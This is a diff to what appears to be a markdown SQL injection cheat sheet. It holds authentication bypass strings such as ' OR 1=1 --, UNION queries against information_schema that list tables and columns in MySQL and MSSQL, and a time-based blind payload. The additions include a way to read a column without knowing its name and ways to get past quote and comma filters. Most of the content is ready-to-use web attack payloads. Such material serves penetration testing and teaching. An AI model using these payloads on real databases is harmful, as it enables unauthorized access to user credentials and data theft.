@@ -13,17 +13,6 @@
   
 * _[$input_user]_ : `' OR 1=1 LIMIT 1 --`
 
-### Special Bypassing
-* Bypassing filtered `'`__[quote]__
-
-```   
- <?php 
- $name = preg_replace("'","",$name);
- $pass = preg_replace("'","",$pass);
- SELECT * FROM users WHERE username='name' and password='pass'
-```
-  _[attack]_ => user = `\`  & pass = `OR 1=1 --`
-
 ## For Mysql
   _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
 ###### Assume no of columns to be 3
@@ -37,6 +26,10 @@
 *  _[$input_user]_ : `' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()`
 *  _[$input_user]_ : `' UNION SELECT table_name, column_name, 1 FROM information_schema.columns`
 
+### Fetching a particular column without knowing column's name
+* `SELECT F.4 FROM (SELECT 1, 2, 3, 4 UNION SELECT * FROM users)F;` will fetch 4th column of `users`.
+
+  It works because the column names of the table derived from the subselect are the values of the leftmost `SELECT`
 ## For Mssql
   _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
 ###### Assume no of columns to be 3
@@ -80,6 +73,22 @@ __[In MsSQL, if second colums is `username` then the payload `' UNION SELECT 1,1
 * _[$input_user]_ : `' OR CONDITION='true' AND 1=randomblob(100000000) --`
 
     [Produces a delayed response if CONDITION='true']
+
+## Bypassing BLACKLISTED CHARS
+* `,` using `JOIN`
+
+  `SELECT 1,2,3 FROM users` : `SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c`
+
+* Bypassing filtered `'`__[quote]__ (special case)
+
+```   
+ <?php 
+ $name = preg_replace("'","",$name);
+ $pass = preg_replace("'","",$pass);
+ SELECT * FROM users WHERE username='name' and password='pass'
+```
+  _[attack]_ => user = `\`  & pass = `OR 1=1 --`
+
 ## Common-errs
 * `mysql` does a case insensitive search by default and also ignores the trailing spaces
 
